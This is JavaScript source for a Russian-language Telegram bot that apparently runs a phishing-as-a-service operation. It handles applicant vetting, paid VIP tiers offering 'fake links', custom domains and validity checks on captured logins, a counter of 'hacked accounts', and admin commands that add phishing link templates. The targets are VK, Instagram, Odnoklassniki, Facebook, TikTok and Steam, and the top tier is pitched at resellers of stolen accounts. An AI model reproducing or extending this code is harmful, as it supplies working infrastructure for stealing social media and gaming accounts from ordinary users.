bot.onText(/👥 Мои аккаунты/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `👀Пожалуйста выберите тип аккаунтов`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Вконтакте',
                        callback_data: 'showAccs_vk'
                    }, {
                        text: 'Instagram',
                        callback_data: 'showAccs_inst'
                    }],
                    [{
                        text: 'Одноклассники',
                        callback_data: 'showAccs_ok'
                    }, {
                        text: 'Facebook',
                        callback_data: 'showAccs_fb'
                    }],
                    [{
                        text: 'TikTok',
                        callback_data: 'showAccs_tt'
                    }, {
                        text: 'Steam',
                        callback_data: 'showAccs_st'
                    }],
                    [{
                        text: '➡️',
                        callback_data: 'nextAccsReplay_3'
                    }]
                ]
            }
        })
    }
})
bot.onText(/🔗 Мои ссылки/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        if (user.vip) {
            bot.sendMessage(msg.chat.id, `Пожалуйста выберите категорию`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Вконтакте',
                            callback_data: 'showLinks_vk'
                        }, {
                            text: 'Instagram',
                            callback_data: 'showLinks_inst'
                        }],
                        [{
                            text: 'Одноклассники',
                            callback_data: 'showLinks_ok'
                        }, {
                            text: 'Facebook',
                            callback_data: 'showLinks_fb'
                        }],
                        [{
                            text: 'TikTok',
                            callback_data: 'showLinks_tt'
                        }, {
                            text: 'Steam',
                            callback_data: 'showLinks_st'
                        }],
                        [{
                            text: '➡️',
                            callback_data: 'nextLinksReplay_3'
                        }]
                    ]
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса.\nВы можете приобрести его пополнив баланс и нажав кнопку ниже`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    }
})
bot.onText(/📊 О боте/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        sendMessageWIK(msg.chat.id, `📊 Статистика\n\nРегистраций в боте: <b>${(await data.find()).length}</b>\nПодписчиков в канале: <b>${await bot.getChatMemberCount('@ssniffer')}</b>\nВзломанных аккаунтов: <b>${(await account.find()).length}</b>\n\nМы работаем с 2021 года.`)
    }
})
bot.onText(/👑 VIP Статус/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        if (user.vip) {
            let vipType = ''
            if (user.vipType == '1') {
                vipType = 'Рабочий'
            }
            if (user.vipType == '2') {
                vipType = 'Любитель'
            }
            if (user.vipType == '3') {
                vipType = 'Профи'
            }
            if (user.vipType == '4') {
                vipType = 'Предприниматель'
            }
            bot.sendMessage(msg.chat.id, `У вас есть <b>VIP</b> статус [${vipType}].\nVIP закончится через ${StringDate(new Date(user.vipDate))}`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Продлить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        } else {
            bot.sendMessage(msg.chat.id, `У вас нет активного <b>VIP</b> статуса.\nВы можете приобрести его пополнив баланс и нажав кнопку ниже`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    }
})
bot.onText(/👥 Наш чат/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, 'Вступить в чат можно по ссылке ниже \n' + process.env.Chat)
    }
})
bot.onText(/❓ Информация/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, `<b>❓ Информация</b>\n\n<b>♦️ Администратор</b> - ${process.env.Admin}  (По всем вопросам)\n\nОтветы на самые часто задаваемые вопросы написаты в статье\n//ТУТ ССЫЛКА//`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Правила',
                        url: 'https://t.me/snifer_rules'
                    }]
                ]
            },
            parse_mode: 'HTML'
        })
    }
})
bot.onText(/⚡️ Новости/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.chat.id
    })
    if (user.isAccepted == 'true') {
        bot.sendMessage(msg.chat.id, 'Канал с новостями \n' + process.env.Channel)
    }
})

bot.on("callback_query", async (callbackQuery) => {
    const msg = callbackQuery.message;
    if (callbackQuery.data.split('_')[0] == 'experiance') {
        bot.deleteMessage(msg.chat.id, msg.message_id)
        if (callbackQuery.data.split('_')[1] == 'true') {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                expirience: 'Да'
            }, {
                upsert: true
            })
        } else {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                expirience: 'Нет'
            }, {
                upsert: true
            })
        }
        bot.deleteMessage(msg.chat.id, msg.message_id - 1)
        bot.answerCallbackQuery(callbackQuery.id).then(() => {
            bot.sendMessage(msg.chat.id, '2. Откуда узнали о нашем проекте', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Реклама",
                            callback_data: "from_ad"
                        }, {
                            text: "От друзей",
                            callback_data: "from_friend"
                        }],
                        [{
                            text: "Другое",
                            callback_data: "from_other"
                        }]
                    ]
                }
            })
        })
    }
    if (callbackQuery.data.split('_')[0] == 'from') {
        bot.deleteMessage(msg.chat.id, msg.message_id)
        if (callbackQuery.data.split('_')[1] == 'ad') {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                from: 'Реклама'
            }, {
                upsert: true
            })
        } else if (callbackQuery.data.split('_')[1] == 'friend') {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                from: 'От друзей'
            }, {
                upsert: true
            })
        } else {
            await data.updateOne({
                tg_id: msg.chat.id
            }, {
                from: 'Другое'
            }, {
                upsert: true
            })
        }
        bot.answerCallbackQuery(callbackQuery.id).then(() => {
            bot.sendMessage(msg.chat.id, 'Спасибо за ответы, перед тем как пользоваться сервисом обязательно прочитайте правила', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "📄 Правила",
                            url: "https://t.me/snifer_rules"
                        }],
                        [{
                            text: "✅ Я прочитал",
                            callback_data: "rules_true"
                        }]
                    ]
                }
            })
        })
    }
    if (callbackQuery.data.split('_')[0] == 'rules') {
        bot.deleteMessage(msg.chat.id, msg.message_id)
        bot.answerCallbackQuery(callbackQuery.id).then(async () => {
            const condidate = await data.findOne({
                tg_id: msg.chat.id
            })
            bot.sendMessage(process.env.NotifyGroup, `💣<b>Новая заявка!</b>\n🆔TG id: ${msg.chat.id}\n♦️Пользователь: @${msg.chat.username}\n🏅Опыт: <i>${condidate.expirience}</i>\n🗣Откуда узнали: <i>${condidate.from}</i>\n⚖️Статус заявки: <b>Необходимо обработать </b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "✅ Принять",
                            callback_data: `accept_${msg.chat.id}`
                        }],
                        [{
                            text: "❌ Отклонить",
                            callback_data: `reject_${msg.chat.id}`
                        }]
                    ]
                },
                parse_mode: "HTML"
            })
            bot.sendMessage(msg.chat.id, 'Ваша заявка успешно отправлена, в ближайшее время вы получите ответ.', {
                reply_markup: {
                    keyboard: [
                        ["Написать админу"]
                    ],
                    resize_keyboard: true,
                }
            })
        })
    }
    if (callbackQuery.data.split('_')[0] == 'accept') {
        bot.editMessageText(callbackQuery.message.text.substr(0, callbackQuery.message.text.length - 21) + 'Принята', {
            chat_id: msg.chat.id,
            message_id: msg.message_id
        }, {
            reply_markup: {
                inline_keyboard: []
            },
            parse_mode: "HTML"
        })
        await data.updateOne({
            tg_id: callbackQuery.data.split('_')[1]
        }, {
            isAccepted: 'true'
        }, {
            upsert: true
        })
        bot.sendMessage(callbackQuery.data.split('_')[1], 'Поздравляем ваша заявка принята!', {
            reply_markup: {
                keyboard: [
                    ['👤 Мой профиль', '🔗 Мои ссылки'],
                    ['👥 Мои аккаунты', '👑 VIP Статус'],
                    ['❓ Информация', '👥 Наш чат'],
                    ['⚡️ Новости', '📊 О боте']
                ],
                resize_keyboard: true,
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'reject') {
        bot.editMessageText(callbackQuery.message.text.substr(0, callbackQuery.message.text.length - 21) + 'Отклонена', {
            chat_id: msg.chat.id,
            message_id: msg.message_id
        }, {
            reply_markup: {
                inline_keyboard: []
            },
            parse_mode: "HTML"
        })
        await data.updateOne({
            tg_id: callbackQuery.data.split('_')[1]
        }, {
            isAccepted: 'false'
        }, {
            upsert: true
        })
        bot.sendMessage(callbackQuery.data.split('_')[1], `К сожалению ваша заявка не прошла отбор, вы можете попробовать еще раз позже.`, {
            reply_markup: {
                keyboard: [
                    ["Подать заявку"],
                    ["Написать админу"]
                ],
                resize_keyboard: true,
            }
        })
    }
    if (callbackQuery.data == 'show_vip') {
        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
        bot.sendMessage(callbackQuery.message.chat.id, `Выберите один из вариантов`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Рабочий [50₽-7дней]',
                        callback_data: 'vip_1'
                    }],
                    [{
                        text: 'Любитель [300₽-30дней]',
                        callback_data: 'vip_2'
                    }],
                    [{
                        text: 'Профи [500₽-60дней]',
                        callback_data: 'vip_3'
                    }],
                    [{
                        text: 'Предприниматель[2500₽-30дней]',
                        callback_data: 'vip_4'
                    }]
                ]
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'vip') {
        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
        if (callbackQuery.data.split('_')[1] == '1') {
            bot.sendMessage(msg.chat.id, '<b>VIP - Рабочий</b>\n<i>Подходит для новичков</i>\n\n- Видоизменение фейк-ссылки при создании/Редактировании\n- Можно включить проверку валидности данных\n- Доступны VIP фейки\n- Проверка на повторяющиеся аккаунты\n- Уведомления о новых аккаунтах: В браузере, Telegram, VK\n- <b>Ваши аккаунты видны "Предпринимателям</b>"', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Купить VIP за 50₽",
                            callback_data: 'buy_vip1'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
        if (callbackQuery.data.split('_')[1] == '2') {
            bot.sendMessage(msg.chat.id, '<b>VIP - Любитель</b>\n<i>Подходит для большинства пользователей</i>\n\n- Установка личных доменов\n- Видоизменение фейк-ссылки при создании/Редактировании\n- Можно включить проверку валидности данных\n- Доступны VIP фейки\n- Проверка на повторяющиеся аккаунты\n- Уведомления о новых аккаунтах: В браузере, Telegram, VK\n- <b>Ваши аккаунты видны только вам!</b>"', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Купить VIP за 300₽",
                            callback_data: 'buy_vip2'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
        if (callbackQuery.data.split('_')[1] == '3') {
            bot.sendMessage(msg.chat.id, '<b>VIP - Профи</b>\n<i>Подходит для определенного круга пользователей</i>\n\n- Установка личных доменов\n- Видоизменение фейк-ссылки при создании/Редактировании\n- Можно включить проверку валидности данных\n- Доступны VIP фейки\n- Проверка на повторяющиеся аккаунты\n- Уведомления о новых аккаунтах: В браузере, Telegram, VK\n- <b>Ваши аккаунты видны только вам!</b>"', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Купить VIP за 500₽",
                            callback_data: 'buy_vip3'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
        if (callbackQuery.data.split('_')[1] == '4') {
            bot.sendMessage(msg.chat.id, '<b>VIP - Предприниматель</b>\n<i>Подходит для продавцов </i>\n\n- 1 Бесплатный готовый сайт для продаж\n- Связь с Администраторами 24/7!\n- Установка личных доменов\n- Видоизменение фейк-ссылки при создании/Редактировании\n- Можно включить проверку валидности данных\n- Доступны VIP фейки\n- Проверка на повторяющиеся аккаунты\n- Уведомления о новых аккаунтах: В браузере, Telegram, VK\n- <b>Ваши аккаунты видны только вам!</b>"', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Купить VIP за 2500₽",
                            callback_data: 'buy_vip4'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
        }
    }
    if (callbackQuery.data.split('_')[0] == 'buy') {
        let user = await data.findOne({
            tg_id: callbackQuery.message.chat.id
        })
        if (callbackQuery.data.split('_')[1] == 'vip1') {
            if (user.balance >= 50) {
                if (user.vip) {
                    let date = new Date(user.vipDate)
                    date.setDate(date.getDate() + 7)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 50,
                        vip: true,
                        vipDate: date,
                        vipType: '1'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                } else {
                    let date = new Date()
                    date.setDate(date.getDate() + 7)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 50,
                        vip: true,
                        vipDate: date,
                        vipType: '1'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                }
            } else {
                bot.editMessageText('У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id
                })
            }
        }
        if (callbackQuery.data.split('_')[1] == 'vip2') {
            if (user.balance >= 300) {
                if (user.vip) {
                    let date = new Date(user.vipDate)
                    date.setDate(date.getDate() + 30)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 300,
                        vip: true,
                        vipDate: date,
                        vipType: '2'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                } else {
                    let date = new Date()
                    date.setDate(date.getDate() + 30)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 300,
                        vip: true,
                        vipDate: date,
                        vipType: '2'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                }
            } else {
                bot.editMessageText('У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id
                })
            }
        }
        if (callbackQuery.data.split('_')[1] == 'vip3') {
            if (user.balance >= 500) {
                if (user.vip) {
                    let date = new Date(user.vipDate)
                    date.setDate(date.getDate() + 60)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 500,
                        vip: true,
                        vipDate: date,
                        vipType: '3'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                } else {
                    let date = new Date()
                    date.setDate(date.getDate() + 60)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 500,
                        vip: true,
                        vipDate: date,
                        vipType: '3'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                }
            } else {
                bot.editMessageText('У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id
                })
            }
        }
        if (callbackQuery.data.split('_')[1] == 'vip4') {
            if (user.balance >= 2500) {
                if (user.vip) {
                    let date = new Date(user.vipDate)
                    date.setDate(date.getDate() + 30)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 2500,
                        vip: true,
                        vipDate: date,
                        vipType: '4'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                } else {
                    let date = new Date()
                    date.setDate(date.getDate() + 30)
                    await data.updateOne({
                        tg_id: callbackQuery.message.chat.id
                    }, {
                        balance: user.balance - 2500,
                        vip: true,
                        vipDate: date,
                        vipType: '4'
                    }, {
                        upsert: true
                    }).catch(err => console.log(err))
                    bot.editMessageText(`VIP успешно приобретен\nVIP закончится через ${StringDate(date)}`, {
                        chat_id: callbackQuery.message.chat.id,
                        message_id: callbackQuery.message.message_id
                    })
                }
            } else {
                bot.editMessageText('У вас недостсточно средств на балансе, для пополения обратитесь к ' + process.env.Admin, {
                    chat_id: callbackQuery.message.chat.id,
                    message_id: callbackQuery.message.message_id
                })
            }
        }
    }
    if (callbackQuery.data.split('_')[0] == 'prevAcc') {
        PreviousAccount(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'nextAcc') {
        NextAccount(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showAccs') {
        if (callbackQuery.data.split('_')[1] == 'all') {
            bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
            bot.sendMessage(msg.chat.id, `👀Пожалуйста выберите тип аккаунтов`, {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Вконтакте',
                            callback_data: 'showAccs_vk'
                        }, {
                            text: 'Instagram',
                            callback_data: 'showAccs_inst'
                        }],
                        [{
                            text: 'Одноклассники',
                            callback_data: 'showAccs_ok'
                        }, {
                            text: 'Facebook',
                            callback_data: 'showAccs_fb'
                        }],
                        [{
                            text: 'TikTok',
                            callback_data: 'showAccs_tt'
                        }, {
                            text: 'Steam',
                            callback_data: 'showAccs_st'
                        }],
                        [{
                            text: '➡️',
                            callback_data: 'nextAccsReplay_3'
                        }]
                    ]
                }
            })
        } else {
            ShowAccounts(callbackQuery)
        }
    }
    if (callbackQuery.data.split('_')[0] == 'showLinks') {
        ShowLinks(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showLinkInfo') {
        ShowLinkInfo(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showNextLinkQuery') {
        showNextLink(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'showPrevLinkQuery') {
        showPrevLink(callbackQuery)
    }
    if (callbackQuery.data == 'showLinksMenu') {
        bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id)
        bot.sendMessage(msg.chat.id, `Пожалуйста выберите категорию`, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'Вконтакте',
                        callback_data: 'showLinks_vk'
                    }, {
                        text: 'Instagram',
                        callback_data: 'showLinks_inst'
                    }],
                    [{
                        text: 'Одноклассники',
                        callback_data: 'showLinks_ok'
                    }, {
                        text: 'Facebook',
                        callback_data: 'showLinks_fb'
                    }],
                    [{
                        text: 'TikTok',
                        callback_data: 'showLinks_tt'
                    }, {
                        text: 'Steam',
                        callback_data: 'showLinks_st'
                    }],
                    [{
                        text: '➡️',
                        callback_data: 'nextLinksReplay_3'
                    }]
                    
                ]
            }
        })
    }
    if (callbackQuery.data.split('_')[0] == 'nextAccsReplay') {
        ShowNextAccsReplay(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'prevLinksReplay') {
        ShowPrevLinksReplay(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'nextLinksReplay') {
        ShowNextLinksReplay(callbackQuery)
    }
    if (callbackQuery.data.split('_')[0] == 'prevLinksReplay') {
        ShowPrevLinksReplay(callbackQuery)
    }
})

bot.onText(/\/givebalance/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.from.id
    })
    if (user.isAdmin) {
        if (msg.text.split(' ')[1] !== '' && (msg.text.split(' ')[2] !== '' && Number.isInteger(Number(msg.text.split(' ')[2])))) {
            await data.findOne({
                tg_id: Number(msg.text.split(' ')[1])
            }).then(async (user) => {
                if (user) {
                    await data.updateOne({
                        tg_id: Number(msg.text.split(' ')[1])
                    }, {
                        balance: Number(user.balance) + Number(msg.text.split(' ')[2]),
                    }, {
                        upsert: true
                    }).then((data) => {
                        if (data) {
                            bot.sendMessage(msg.chat.id, `Баланс @${user.login} успешно обновлен (${user.balance}₽ → ${user.balance+Number(msg.text.split(' ')[2])}₽)`)
                            bot.sendMessage(Number(msg.text.split(' ')[1]), `Ваш баланс был обновлен (${user.balance}₽ → ${user.balance+Number(msg.text.split(' ')[2])}₽)`)
                        }
                    }).catch(err => {
                        bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
                    });
                } else {
                    bot.sendMessage(msg.chat.id, 'Пользователь с таким ID не найден')
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/givebalnce <userID> <amount>')
        }
    }
})
bot.onText(/\/unvip/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.from.id
    })
    if (user.isAdmin) {
        if (msg.text.split(' ')[1] !== '' && msg.text.split(' ')[2] !== '') {
            await data.findOne({
                tg_id: Number(msg.text.split(' ')[1])
            }).then(async (user) => {
                if (user) {
                    await data.updateOne({
                        tg_id: Number(msg.text.split(' ')[1])
                    }, {
                        vip: false,
                        vipDate: '',
                        vipType: '',
                    }, {
                        upsert: true
                    }).then((data) => {
                        if (data) {
                            bot.sendMessage(msg.text.split(' ')[1], `Ваш статус VIP был обновлен.`)
                            bot.sendMessage(msg.chat.id, `С пользователя @${user.login} успешно снят VIP статус.`)
                        }
                    }).catch(err => {
                        bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
                    });
                } else {
                    bot.sendMessage(msg.chat.id, 'Пользователь с таким ID не найден')
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/givebalnce <userID> <amount>')
        }
    }
})
bot.onText(/\/clear/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.from.id
    })
    if (user.isAdmin) {
        if (msg.text.split(' ')[1] !== '' && msg.text.split(' ')[2] !== '') {
            await data.findOne({
                tg_id: Number(msg.text.split(' ')[1])
            }).then(async (user) => {
                if (user) {
                    await data.deleteOne({
                        tg_id: Number(msg.text.split(' ')[1])
                    }).then((data) => {
                        if (data) {
                            bot.sendMessage(msg.chat.id, `Аккаунт @${user.login} успешно удален.`)
                        }
                    }).catch(err => {
                        bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
                    });
                } else {
                    bot.sendMessage(msg.chat.id, 'Пользователь с таким ID не найден')
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/clear <userID>')
        }
    }
})
bot.onText(/\/addnewlink/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.from.id
    })
    if (user.isAdmin) {
        if (msg.text.split(' ')[1] !== '' && msg.text.split(' ')[2] !== '') {
            await link.findOne({
                link: msg.text.split(' ')[1]
            }).then(async (user) => {
                let querys = [],type = ''
                msg.text.split(' ')[2].split(',').map(e=>{
                    e=e.substr(1,e.length-2).split('|')
                    type = e[1]
                    querys[e[0]]={name:e[2], description:e[3].split('_').join(' '), image: e[4], redirect: e[5]}
                })
                 await new link({
                        link: msg.text.split(' ')[1],
                        type: type,
                        query: querys,
                }).save().then(() => {
                    bot.sendMessage(msg.chat.id, 'Ссылка успешно добавлена')
                })
            })
        } else {
            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/clear <userID>')
        }
    }
})
bot.onText(/\/removelink/, async (msg) => {
    const user = await data.findOne({
        tg_id: msg.from.id
    })
    if (user.isAdmin) {
        if (msg.text.split(' ')[1] !== '') {
            await link.findOne({
                link: msg.text.split(' ')[1]
            }).then(async (link) => {
                if(link){
                    if(msg.text.split(' ')[2]){
                        let query = link.query
                        query.splice(Number(msg.text.split(' ')[2]), 1)
                        console.log(query)
                        await link.updateOne({
                            link: msg.text.split(' ')[1]
                        }, {
                            query: query
                        }, {
                            upsert: true
                        }).then((data) => {
                            if (data) {
                                bot.sendMessage(msg.chat.id, `Шаблон #${msg.text.split(' ')[2]} успешно удален`)
                            }
                        }).catch(err => {
                            bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
                        });
                    }else{
                        await link.deleteOne({
                            link: msg.text.split(' ')[1]
                        }).then((data) => {
                            if (data) {
                                bot.sendMessage(msg.chat.id, `Ссылка ${msg.text.split(' ')[1]} успешно удалена`)
                            }
                        }).catch(err => {
                            bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
                        });
                    }
                }else{
                    bot.sendMessage(msg.chat.id, 'Такой ссылки не найдено.')
                }
            })
        } else {
            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/clear <userID>')
        }
    }
})
bot.on('message', msg => {
    console.log(msg)
})